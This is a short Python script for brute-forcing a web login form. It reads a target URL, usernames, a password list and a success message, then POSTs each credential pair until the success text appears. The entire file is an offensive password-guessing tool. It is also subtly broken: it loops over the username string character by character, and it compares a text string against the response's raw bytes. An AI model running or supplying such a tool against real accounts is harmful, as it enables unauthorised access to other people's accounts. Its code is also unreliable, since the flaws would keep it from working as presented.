import requests
import sys

if len(sys.argv) != 5:
    print(f"[*] Use: python3 {sys.argv[0]} <target> <username/s> <password-list> <success-message>")
    print("[!] You can introduce a single username or a list of usernames.")
    print("[!] The success message is a a sentence that only appears if the login is successful.")
    sys.exit(1)

target = sys.argv[1]
usernames = sys.argv[2]
password_list = sys.argv[3]
success_message = sys.argv[4]

for user in usernames:
    with open(password_list, "r") as passwords:
        for password in passwords:
            password = password.strip("\n").encode()
            sys.stdout.write("\n")
            sys.stdout.write(f"[!] Attemping {user}:{password}")

            req = requests.post(target, data={"username": user,"password": password})
            if success_message in req.content:
                print(f"\tThe password {password} for the user {user} is correct")
                sys.exit(0)
        sys.stdout.write("\n")
        sys.stdout.write(f"\tNo password found for the username {user}")